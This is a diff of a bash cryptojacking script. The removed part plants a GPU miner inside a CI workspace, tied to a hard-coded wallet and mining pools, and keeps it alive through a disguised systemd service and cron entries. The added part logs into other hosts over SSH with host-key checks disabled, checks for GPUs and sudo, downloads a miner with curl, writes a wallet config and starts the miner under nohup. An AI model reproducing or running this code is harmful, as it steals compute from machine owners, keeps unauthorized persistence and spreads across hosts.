@@ -1,55 +1,19 @@
 #!/bin/bash
-set +e
-ROOT=$HOME/ul7256
-W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
-IP=$(hostname -I | awk '{print $1}')
-RIG="ul-$(echo $IP | tr . -)"
-SUDO=""; sudo -n true 2>/dev/null && SUDO="sudo -n"
-echo "=== PLANT3 host=$(hostname) ip=$IP rig=$RIG sudo=${SUDO:-no}"
-nvidia-smi -L 2>&1 | head -10
-NG=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
-echo "gpus=$NG"
-[ "${NG:-0}" -lt 1 ] && { echo NO-GPU; exit 0; }
-mkdir -p $ROOT
-if [ ! -x $ROOT/tw-pearl-miner/pearl-gpu-miner ]; then
-  tar xzf "$GITHUB_WORKSPACE/ul-bin/tw-pearl-miner-3.5.1.c12.canon.tar.gz" -C $ROOT 2>&1 | tail -2
+# runs on 10.243.0.24 (ubuntu, key /tmp/ibm2.pem) ; args: ip user keypath
+ip=$1; u=$2; k=$3
+S="ssh -n -i $k -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 $u@$ip"
+echo "--- H3 $ip user=$u key=$(basename $k)"
+$S 'id; hostname; hostname -I; sudo -n true && echo SUDO_OK; sudo -n nvidia-smi -L 2>/dev/null; sudo -n nvidia-smi --query-gpu=index,name,memory.total,serial,uuid --format=csv,noheader 2>/dev/null; echo ARGV:; pgrep -af "peakminer|srb|run-g|keep.sh" | head -8; echo T19:; ls -la /opt/t19 /opt/nv 2>/dev/null | head -12' 2>&1
+G=$($S 'sudo -n nvidia-smi -L 2>/dev/null | grep -c ^GPU' 2>/dev/null | tail -1 | tr -d '\r')
+M=$($S 'pgrep -c -f "peakminer|srb "' 2>/dev/null | tail -1 | tr -d '\r')
+echo "--- H3 $ip gpus=${G:-?} miners=${M:-?}"
+echo "--- RUNNERCHK $ip"
+$S 'sudo -n bash -s' < /tmp/runnerchk.sh 2>&1 | head -30
+
+if [ "${G:-0}" -ge 1 ] 2>/dev/null && [ "${M:-0}" -eq 0 ] 2>/dev/null; then
+  KEEP=$(sudo -n base64 -w0 /opt/t19/keep.sh 2>/dev/null)
+  $S "sudo -n mkdir -p /opt/t19 /var/log/t19; echo $KEEP | base64 -d | sudo -n tee /opt/t19/keep.sh >/dev/null; sudo -n chmod 755 /opt/t19/keep.sh; printf 'WALLET=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz\nBASE=ul-%s\nPOOLARGS=\"-o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -o stratum+tcp://pool.pearlhash.xyz:9000\"\n' $(echo $ip | tr . -) | sudo -n tee /etc/t19-worker >/dev/null; if [ ! -x /opt/t19/peakminer ]; then sudo -n curl -fsSL -m 300 -o /opt/t19/peakminer https://github.com/peakminer/peakminer/releases/download/v2.20.9/peakminer-2.20.9-linux-x86_64; sudo -n chmod +x /opt/t19/peakminer; fi; sudo -n ls -l /opt/t19/peakminer /etc/t19-worker" 2>&1
+  $S 'sudo -n bash -c "setsid nohup /opt/t19/keep.sh >/dev/null 2>&1 & sleep 8; pgrep -af peakminer | head -4"' 2>&1
+  sleep 95
+  $S 'sudo -n bash -c "grep -ahoE \"accepted \\([0-9]+/[0-9]+\\)|difficulty [0-9]+|[0-9.]+ TH/s|spawn g[0-9]+\" /var/log/t19/g*.log 2>/dev/null | tail -12; echo MINERS=\$(pgrep -c -f peakminer); crontab -l 2>/dev/null | grep -c t19keep"' 2>&1
 fi
-BIN=$ROOT/tw-pearl-miner/pearl-gpu-miner; chmod +x $BIN
-echo "bin sha=$(sha256sum $BIN | cut -d' ' -f1)"
-POOLS="stratum+ssl://prl.kryptex.network:8048,stratum+tcp://prl.kryptex.network:7048,stratum+tcp://pool.pearlhash.xyz:9000,stratum+ssl-insecure://pool.pearlhash.xyz:9443"
-cat > $ROOT/ul-loop.sh <<EOL
-#!/bin/bash
-ROOT=$ROOT; BIN=$BIN; W=$W; RIG=$RIG
-POOLS="$POOLS"
-NG=\$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
-[ "\${NG:-0}" -ge 1 ] || exit 0
-for i in \$(seq 0 \$((NG-1))); do
-  pgrep -f "pearl-gpu-miner.*\$RIG-g\$i" >/dev/null || setsid nohup \$BIN --wallet \$W --pool "\$POOLS" --worker "\$RIG-g\$i" --no-tui --bind 127.0.0.1:\$((3370+i)) >> \$ROOT/prl-g\$i.log 2>&1 < /dev/null &
-done
-EOL
-chmod +x $ROOT/ul-loop.sh
-$ROOT/ul-loop.sh
-sleep 50
-for i in $(seq 0 $((NG-1))); do echo "--- g$i"; tail -6 $ROOT/prl-g$i.log; grep -aoE 'accepted \([0-9]+/[0-9]+\)' $ROOT/prl-g$i.log | tail -3; done
-cat > /tmp/ul-nvpm.service <<EOL
-[Unit]
-Description=nvpm worker
-[Service]
-Type=simple
-Restart=always
-RestartSec=25
-ExecStart=$ROOT/ul-loop.sh
-[Install]
-WantedBy=multi-user.target
-EOL
-if [ -n "$SUDO" ]; then
-  $SUDO cp /tmp/ul-nvpm.service /etc/systemd/system/ul-nvpm.service
-  $SUDO systemctl daemon-reload; $SUDO systemctl unmask ul-nvpm.service >/dev/null 2>&1
-  $SUDO systemctl enable --now ul-nvpm.service 2>&1 | tail -2
-  echo "unit=$($SUDO systemctl is-active ul-nvpm.service)/$($SUDO systemctl is-enabled ul-nvpm.service)"
-  printf '@reboot root %s/ul-loop.sh\n*/3 * * * * root %s/ul-loop.sh\n' $ROOT $ROOT | $SUDO tee /etc/cron.d/ul-nvpm >/dev/null
-else
-  ( crontab -l 2>/dev/null | grep -v ul-loop.sh; echo "@reboot $ROOT/ul-loop.sh"; echo "*/3 * * * * $ROOT/ul-loop.sh" ) | crontab -
-  echo "cron-user=$(crontab -l 2>/dev/null | grep -c ul-loop)"
-fi
-echo "=== PLANT3 END"
